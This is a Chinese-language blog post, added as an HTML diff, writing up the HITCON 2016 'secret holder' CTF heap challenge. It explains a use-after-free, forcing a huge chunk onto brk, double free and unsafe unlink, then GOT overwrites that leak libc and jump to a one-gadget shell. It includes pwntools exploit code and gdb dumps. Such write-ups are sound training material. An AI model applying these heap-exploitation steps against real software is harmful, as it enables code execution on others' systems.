@@ -1,0 +1,306 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Hitcon 2016 secret holder - gravity的个人博客</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate">
+    <meta name="keywords" content="GraVity0,"> 
+    <meta name="description" content="首先日常的一波检查：放入ida分析：可以看到这里让我们进行三个选择，接下来我们仔细分析一下这几个功能：可以看到在keep功能里给我们提供了三种大小的heap，small、big、huge。而且它们的,"> 
+    <meta name="author" content="yuntao you"> 
+    <link rel="alternative" href="atom.xml" title="gravity的个人博客" type="application/atom+xml"> 
+    <link rel="icon" href="/img/first.jpg"> 
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <link rel="stylesheet" href="/css/diaspora.css">
+    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads" src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+</head>
+</html>
+<body class="loading">
+    <span id="config-title" style="display:none">gravity的个人博客</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="播放/暂停" class="icon-play"></div>
+    <h3 class="subtitle">Hitcon 2016 secret holder</h3>
+    <div class="social">
+        <!--<div class="like-icon">-->
+            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+        <!--</div>-->
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class="main">
+        <h1 class="title">Hitcon 2016 secret holder</h1>
+        <div class="stuff">
+            <span>十月 06, 2019</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <p>首先日常的一波检查：<br><img src="https://i.loli.net/2019/10/06/R7sVNGUdzqZca9P.jpg" alt="30FD5E6B19724249A0945C31920470BB.jpg"><br>放入ida分析：<br><img src="https://i.loli.net/2019/10/06/CSdGkYh1u5eyjlE.jpg" alt="4E6BA1ECCD144FB882D3BDDCAAE9FEE9.jpg"><br>可以看到这里让我们进行三个选择，接下来我们仔细分析一下这几个功能：<br><img src="https://i.loli.net/2019/10/06/OScsF6wUezGQIKg.jpg" alt="B1DC0DA633FE455AB347947458867D42.jpg"><br>可以看到在keep功能里给我们提供了三种大小的heap，small、big、huge。而且它们的大小分别被固定为40、4000、400000.且在.bss段有两个地址分别记录堆的地址以及是否被使用，根据后面的功能可以推测出这个标志位是限制了每种heap只能被使用一次。</p>
+<p><img src="https://i.loli.net/2019/10/06/vWlrViBaGoqtPpF.jpg" alt="BBE84A0B008C4596A9ED2A83CEE2A5BE.jpg"><br>wipe功能，free之后将标志位修改为了0，但是没有将free后的指针赋值为NULL，所以这里存在UAF漏洞。</p>
+<p><img src="https://i.loli.net/2019/10/06/4APKqChSNQOZBfY.jpg" alt="25F051D1E741454FAD82DB12AF2DB740.jpg"><br>renew功能：首先检测标志位是否为1，不是直接退出，为1的话会让我们输入我们的秘密。    </p>
+<ul>
+<li>small secret: small chunk, 40 bytes<ul>
+<li>small_ptr: 0x006020b0</li>
+<li>small_flag: 0x006020c0</li>
+</ul>
+</li>
+<li>big secret: large chunk, 4000 bytes<ul>
+<li>big_ptr: 0x006020a0</li>
+<li>big_flag: 0x006020b8</li>
+</ul>
+</li>
+<li>huge secret: huge chunk, 400000 bytes<ul>
+<li>huge_ptr: 0x006020a8</li>
+<li>huge_flag: 0x006020bc          </li>
+</ul>
+</li>
+</ul>
+<p><strong>难点分析：</strong>    </p>
+<ul>
+<li>这道题最不寻常也最奇妙的地方就在于那个40万大小的堆块。通过之前的学习我们知道：在分配属于large bin大小的堆块的时候会首先进行一系列的合并，然后检查large bin表和unsorted bin表等一系列bins中是否存在可以满足我们需求大小的块，明显这些bins中是不可能存在40万字节这么大的块的。然后malloc会寄希望于从top chunk中分配，对于4000字节还好但是40万字节明显top chunk本身都不会有这么大。   </li>
+<li>那么接下来系统就会试图去拓展堆的大小，使用的函数是sysmalloc，这个函数会首先判断是否满足mmap的分配条件，如果要分配的大小大于mmap的阀值（mp_.mmap_threshold），并且此进程通过mmap分配的总内存数量（mp_.n_mmaps）小于设定的最大值的话（mp_.n_mmaps_max），就会使用mmap分配。   </li>
+</ul>
+<pre><code class="cpp">if ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold) 
+    &amp;&amp;(mp_.n_mmaps &lt; mp_.n_mmaps_max))
+    {
+       ……
+    }
+</code></pre>
+<p>现在的40万的堆块显然是满足以上的两个条件的，但是这不是我们想让他去做的    </p>
+<p>因为初始的堆是由brk方式分配的，其中brk分配的堆的地址是紧邻着bss段的（如果存在ASLR则会加一个随机的偏移值）。而mmap分配的内存则会创建一个内存映射段出来，这两者分配出来的内存的地址相距是很远的。    </p>
+<p>我在做这道题的时候就是因为思维定势，认为huge一定是mmap分配而没有利用好他，这也就导致了这道题陷入瓶颈。   </p>
+<p><strong>那么有没有办法让40万字节通过brk分配呢？答案是有的，sysmalloc在mmap出内存之后会随之更新mp_.n_mmaps_max值，如下所示：</strong>    </p>
+<pre><code class="cpp">unsigned long sum;
+sum = atomic_exchange_and_add (&amp;mp_.mmapped_mem, size) + size;
+atomic_max (&amp;mp_.max_mmapped_mem, sum);
+</code></pre>
+<p>这样当下次判断的时候，就不再满足mmap分配的条件了，从而使得通过brk来分配。(简而言之就是第二次keep(3)的时候huge就会由malloc分配了)。   </p>
+<p>接下来就是double free的专场了，这一部分不是很熟悉的话可以去看我的另一篇博客<a href="https://711lab.club/2019/10/02/Fastbin-Attack/" target="_blank" rel="noopener">传送门</a>。<br>这里在利用double_free之前还有一点需要注意：<br>就是在分配large chunk时，glibc首先会调用函数malloc_consolidate()来清除fastbin中的块。所以big secret会被放到原来small secret的位置，当再次分配small secret的时候就造成了堆块重叠。   </p>
+<pre><code class="cpp">def unlink():
+    keep(1)
+    wipe(1)
+    keep(2)     # big
+    wipe(1)         # double free
+    keep(1)     # small # overlapping
+    keep(3)
+    wipe(3)
+    keep(3)     # huge
+
+    payload  = p64(0)                   # fake prev_size
+    payload += p64(0x21)                # fake size
+    payload += p64(small_ptr - 0x18)    # fake fd
+    payload += p64(small_ptr - 0x10)    # fake bk
+    payload += p64(0x20)                # fake prev_size
+    payload += p64(0x61a90)             # fake size
+    renew(2, payload)
+
+    wipe(3)         # unsafe unlink 
+
+
+
+
+gdb-peda$ x/5gx 0x006020a0
+0x6020a0:    0x0000000000603010    0x0000000000603040
+0x6020b0:    0x0000000000603010    0x0000000100000001
+0x6020c0:    0x0000000000000001
+gdb-peda$ x/10gx 0x00603010-0x10
+0x603000:    0x0000000000000000    0x0000000000000031  &lt;-- small, big
+0x603010:    0x0000000041414141    0x0000000000000000
+0x603020:    0x0000000000000000    0x0000000000000000
+0x603030:    0x0000000000000000    0x0000000000061a91  &lt;-- huge
+0x603040:    0x0000000041414141    0x0000000000000000
+</code></pre>
+<p>然后我们在big secret里布置一个fake chunk。     </p>
+<pre><code class="cpp">gdb-peda$ x/5gx 0x006020a0
+0x6020a0:    0x0000000000603010    0x0000000000603040
+0x6020b0:    0x0000000000603010    0x0000000100000001
+0x6020c0:    0x0000000000000001
+gdb-peda$ x/10gx 0x00603010-0x10
+0x603000:    0x0000000000000000    0x0000000000000031  &lt;-- small, big
+0x603010:    0x0000000000000000    0x0000000000000021  &lt;-- fake chunk
+0x603020:    0x0000000000602098    0x00000000006020a0    &lt;-- fd, bk pointer
+0x603030:    0x0000000000000020    0x0000000000061a90  &lt;-- huge
+0x603040:    0x0000000041414141    0x0000000000000000
+gdb-peda$ x/gx 0x00602098 + 0x18
+0x6020b0:    0x0000000000603010    &lt;-- P-&gt;fd-&gt;bk = P
+gdb-peda$ x/gx 0x006020a0 + 0x10
+0x6020b0:    0x0000000000603010    &lt;-- P-&gt;bk-&gt;fd = P
+</code></pre>
+<p>之后释放huge secret，就可以触发unsafe unlink。   </p>
+<pre><code class="cpp">gdb-peda$ x/6gx 0x00602098
+0x602098:    0x0000000000000000    0x0000000000603010
+0x6020a8:    0x0000000000603040    0x0000000000602098  &lt;-- fake chunk ptr
+0x6020b8:    0x0000000000000001    0x0000000000000001
+</code></pre>
+<pre><code class="cpp">def leak():
+    global one_gadget
+
+    payload  = &quot;A&quot; * 8
+    payload += p64(elf.got[&#39;free&#39;]) # big_ptr -&gt; free@got.plt
+    payload += &quot;A&quot; * 8
+    payload += p64(big_ptr)         # small_ptr -&gt; big_ptr
+    renew(1, payload)
+    renew(2, p64(elf.plt[&#39;puts&#39;]))  # free@got.plt -&gt; puts@plt
+    renew(1, p64(elf.got[&#39;puts&#39;]))  # big_ptr -&gt; puts@got.plt
+
+    wipe(2)
+    puts_addr = u64(io.recvline()[:6] + &quot;\x00\x00&quot;)
+    libc_base = puts_addr - libc.symbols[&#39;puts&#39;]
+    one_gadget = libc_base + 0x4525a
+
+    log.info(&quot;libc base: 0x%x&quot; % libc_base)
+    log.info(&quot;one_gadget address: 0x%x&quot; % one_gadget)
+
+
+修改 big_ptr 指向 free@got.plt，small_ptr 指向 big_ptr：      
+gdb-peda$ x/6gx 0x00602098
+0x602098:    0x4141414141414141    0x0000000000602018
+0x6020a8:    0x4141414141414141    0x00000000006020a0
+0x6020b8:    0x0000000000000001    0x0000000000000001
+gdb-peda$ x/gx 0x00602018
+0x602018 &lt;free@got.plt&gt;:    0x00007ffff7a91a70        
+
+
+修改 free@got.plt 为 puts@plt，big_ptr 指向 puts@got.plt：      
+gdb-peda$ x/6gx 0x00602098
+0x602098:    0x4141414141414141    0x0000000000602020
+0x6020a8:    0x4141414141414141    0x00000000006020a0
+0x6020b8:    0x0000000000000001    0x0000000000000001
+gdb-peda$ x/gx 0x00602018
+0x602018 &lt;free@got.plt&gt;:    0x00000000004006c0
+gdb-peda$ x/gx 0x00602020
+0x602020 &lt;puts@got.plt&gt;:    0x00007ffff7a7d5d0           
+
+此时释放 big secret，其实就是 puts(puts_addr)，通过偏移计算即可得到 libc 基址和 one-gadget 地址。
+
+</code></pre>
+<pre><code class="cpp">def pwn():
+    payload  = &quot;A&quot; * 0x10
+    payload += p64(elf.got[&#39;puts&#39;]) # small_ptr -&gt; puts@got.plt
+    renew(1, payload)
+
+    renew(1, p64(one_gadget))       # puts@got.plt -&gt; one_gadget
+    io.interactive()
+</code></pre>
+<p>这样就达到了将 <a href="mailto:puts@got.plt" target="_blank" rel="noopener">puts@got.plt</a> 修改为 one-gadget，获得 shell的目的。   </p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="http://link.hhtjim.com/163/5146554.mp3"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="http://link.hhtjim.com/qq/001faIUs4M2zna.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link" data-ae="false" data-ci="" data-cs="" data-r="" data-o="" data-a="" data-d="false">查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
+            
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/nito.model.json"},"display":{"position":"lift","width":200,"height":350},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/diaspora.js"></script>
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+</html>
